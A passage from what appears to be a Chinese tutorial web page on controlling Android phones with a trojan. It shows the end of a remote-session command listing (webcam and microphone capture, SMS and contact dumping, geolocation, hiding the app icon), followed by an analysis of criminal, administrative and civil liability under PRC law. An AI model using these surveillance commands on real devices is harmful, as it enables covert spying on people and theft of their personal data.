+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: User interface Commands
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+    Command       Description
+    -------       -----------
+    screenshare   Watch the remote user desktop <span class="token keyword">in</span> real <span class="token function">time</span>
+    screenshot    Grab a screenshot of the interactive desktop
+
+
+Stdapi: Webcam Commands
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+    Command        Description
+    -------        -----------
+    record_mic     Record audio from the default microphone <span class="token keyword">for</span> X seconds
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+
+Stdapi: Audio Output Commands
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio <span class="token function">file</span> <span class="token punctuation">(</span>.wav<span class="token punctuation">)</span> on the target system
+
+
+Android Commands
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+
+    Command           Description
+    -------           -----------
+    activity_start    Start an Android activity from a Uri string
+    check_root        Check <span class="token keyword">if</span> device is rooted
+    dump_calllog      Get call log
+    dump_contacts     Get contacts list
+    dump_sms          Get sms messages
+    geolocate         Get current lat-long using geolocation
+    hide_app_icon     Hide the app icon from the launcher
+    interval_collect  Manage interval collection capabilities
+    send_sms          Sends SMS from target session
+    set_audio_mode    Set Ringer Mode
+    sqlite_query      Query a SQLite database from storage
+    wakelock          Enable/Disable Wakelock
+    wlan_geolocate    Get current lat-long using WLAN information
+
+
+Application Controller Commands
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+    Command        Description
+    -------        -----------
+    app_install    Request to <span class="token function">install</span> apk <span class="token function">file</span>
+    app_list       List installed apps <span class="token keyword">in</span> the device
+    app_run        Start Main Activty <span class="token keyword">for</span> package name
+    app_uninstall  Request to uninstall application
+
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br><span class="line-number">128</span><br><span class="line-number">129</span><br><span class="line-number">130</span><br><span class="line-number">131</span><br><span class="line-number">132</span><br><span class="line-number">133</span><br><span class="line-number">134</span><br><span class="line-number">135</span><br><span class="line-number">136</span><br><span class="line-number">137</span><br><span class="line-number">138</span><br><span class="line-number">139</span><br><span class="line-number">140</span><br><span class="line-number">141</span><br><span class="line-number">142</span><br><span class="line-number">143</span><br><span class="line-number">144</span><br><span class="line-number">145</span><br><span class="line-number">146</span><br><span class="line-number">147</span><br><span class="line-number">148</span><br><span class="line-number">149</span><br><span class="line-number">150</span><br><span class="line-number">151</span><br><span class="line-number">152</span><br><span class="line-number">153</span><br><span class="line-number">154</span><br></div></div><h2 id="法律责任分析"><a href="#法律责任分析" class="header-anchor">#</a> 法律责任分析</h2> <ul><li><strong>刑事责任</strong>：如果通过木马控制手机的行为情节严重，例如：
+<ul><li>控制了多部手机；</li> <li>窃取了大量公民个人信息；</li> <li>造成了被害人财产损失（如盗刷银行卡）；</li> <li>用于实施其他犯罪活动（如敲诈勒索、诈骗等）。
+则可能同时构成 <strong>非法控制计算机信息系统罪</strong> 和 <strong>侵犯公民个人信息罪</strong> ，数罪并罚，面临有期徒刑、拘役或罚金等刑罚。</li></ul></li> <li><strong>行政责任</strong>：如果行为尚未达到刑事立案标准，但已构成对他人隐私的侵犯，公安机关可依据《治安管理处罚法》对其进行<strong>拘留、罚款</strong>等行政处罚。</li> <li><strong>民事责任</strong>：被侵权人（手机被控制者）有权要求侵权人<strong>停止侵害、赔礼道歉、消除影响、恢复名誉、赔偿损失</strong>等。赔偿范围包括为制止侵权行为所支付的合理开支以及精神损害赔偿等。</li></ul> <h2 id="法律依据"><a href="#法律依据" class="header-anchor">#</a> 法律依据</h2> <ol><li><p><strong>《中华人民共和国刑法》第二百八十五条【非法侵入计算机信息系统罪】</strong></p> <blockquote><p>“违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。提供专门用于侵入、非法控制计算机信息系统的程序、工具，或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具，情节严重的，依照前款的规定处罚。单位犯前三款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照各该款的规定处罚。”</p></blockquote> <ul><li><strong>适用解释</strong>：该条款是打击此类行为的核心规定。通过木马程序控制他人手机，属于“非法控制计算机信息系统”的行为。一旦达到“情节严重”的程度，例如控制多人手机、造成严重后果等，即构成刑事犯罪。</li></ul></li> <li><p><strong>《中华人民共和国刑法》第二百五十三条之一【侵犯公民个人信息罪】</strong></p> <blockquote><p>“违反国家有关规定，向他人出售或者提供公民个人信息，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。违反国家有关规定，将在履行职责或者提供服务过程中获得的公民个人信息，出售或者提供给他人的，依照前款的规定从重处罚。窃取或者以其他方法非法获取公民个人信息的，依照第一款的规定处罚。单位犯前三款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照各该款的规定处罚。”</p></blockquote> <ul><li><strong>适用解释</strong>：通过木马程序控制手机，往往伴随着非法获取、窃取手机中存储的公民个人信息（如通讯录、照片、聊天记录等）的行为。这种行为可能构成侵犯公民个人信息罪。</li></ul></li> <li><p><strong>《中华人民共和国治安管理处罚法》第四十二条【侵犯隐私】</strong></p> <blockquote><p>“有下列行为之一的，处五日以下拘留或者五百元以下罚款；情节较重的，处五日以上十日以下拘留，可以并处五百元以下罚款：（一）写恐吓信或者以其他方法威胁他人人身安全的；（二）公然侮辱他人或者捏造事实诽谤他人的；（三）捏造事实诬告陷害他人，企图使他人受到刑事追究或者受到治安管理处罚的；（四）对证人及其近亲属进行威胁、侮辱、殴打或者打击报复的；（五）多次发送淫秽、侮辱、恐吓或者其他信息，干扰他人正常生活的；（六）偷窥、偷拍、窃听、散布他人隐私的。”</p></blockquote> <ul><li><strong>适用解释</strong>：通过木马控制手机，属于典型的“偷窥、偷拍、窃听、散布他人隐私”的行为。即使未达到刑事犯罪的严重程度，也可能面临行政处罚。</li></ul></li></ol></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">Last Updated:</span> <span class="time">11/27/2025, 8:52:32 AM</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev">
+      ←
+      <a href="/network/password/demo01_2025_11_11_01.html" class="prev">
+        kali破解pdf文件密码
+      </a></span> <!----></p></div> </main></div><div class="global-ui"></div></div>
+    <script src="/assets/js/app.97fe8595.js" defer></script><script src="/assets/js/2.fefabc39.js" defer></script><script src="/assets/js/1.462a7e3a.js" defer></script><script src="/assets/js/218.9fa572e9.js" defer></script>
+  </body>
+</html>
